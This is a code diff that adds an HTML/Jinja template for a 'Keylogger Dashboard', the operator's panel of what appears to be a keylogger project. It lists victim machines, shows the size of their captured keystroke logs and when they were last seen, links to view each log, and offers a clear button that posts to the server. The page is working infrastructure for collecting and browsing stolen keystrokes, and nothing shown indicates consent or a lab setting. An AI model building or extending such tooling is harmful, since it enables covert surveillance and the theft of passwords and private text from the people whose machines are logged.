@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Keylogger Dashboard</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: monospace; background: #0d0d0d; color: #e0e0e0; padding: 32px; }
+  h1 { color: #00ff88; font-size: 20px; margin-bottom: 8px; }
+  .sub { color: #666; font-size: 13px; margin-bottom: 32px; }
+  .empty { color: #444; font-size: 14px; margin-top: 40px; }
+  table { width: 100%; border-collapse: collapse; font-size: 14px; }
+  th { text-align: left; padding: 10px 14px; color: #888; border-bottom: 1px solid #222; font-weight: normal; }
+  td { padding: 12px 14px; border-bottom: 1px solid #1a1a1a; vertical-align: middle; }
+  tr:hover td { background: #111; }
+  .host { color: #00ff88; font-weight: bold; }
+  .size { color: #888; }
+  .time { color: #555; font-size: 12px; }
+  .btn { display: inline-block; padding: 6px 14px; border-radius: 4px; font-size: 12px;
+         font-family: monospace; cursor: pointer; border: none; text-decoration: none; }
+  .btn-view  { background: #1a3a2a; color: #00ff88; border: 1px solid #00ff8844; }
+  .btn-view:hover { background: #234d38; }
+  .btn-clear { background: #2a1a1a; color: #ff4444; border: 1px solid #ff444433; margin-left: 8px; }
+  .btn-clear:hover { background: #3d1f1f; }
+  .dot { width: 8px; height: 8px; border-radius: 50%; background: #00ff88;
+         display: inline-block; margin-right: 8px; animation: pulse 2s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
+</style>
+</head>
+<body>
+  <h1>&#9656; Keylogger Dashboard</h1>
+  <p class="sub">Receiving logs from connected machines</p>
+  {% if machines %}
+  <table>
+    <thead>
+      <tr>
+        <th>Machine</th>
+        <th>Log Size</th>
+        <th>Last Seen</th>
+        <th>Actions</th>
+      </tr>
+    </thead>
+    <tbody>
+      {% for m in machines %}
+      <tr>
+        <td><span class="dot"></span><span class="host">{{ m.name }}</span></td>
+        <td class="size">{{ (m.size / 1024) | round(1) }} KB</td>
+        <td class="time">{{ m.last_seen }}</td>
+        <td>
+          <a class="btn btn-view" href="/view/{{ m.name }}">View Log</a>
+          <button class="btn btn-clear" onclick="clearLog('{{ m.name }}')">Clear</button>
+        </td>
+      </tr>
+      {% endfor %}
+    </tbody>
+  </table>
+  {% else %}
+  <p class="empty">No machines connected yet. Waiting for data...</p>
+  {% endif %}
+<script>
+function clearLog(host) {
+  if (!confirm('Clear log for ' + host + '?')) return;
+  fetch('/clear/' + host, { method: 'POST' })
+    .then(() => location.reload());
+}
+setTimeout(() => location.reload(), 30000);
+</script>
+</body>
+</html>
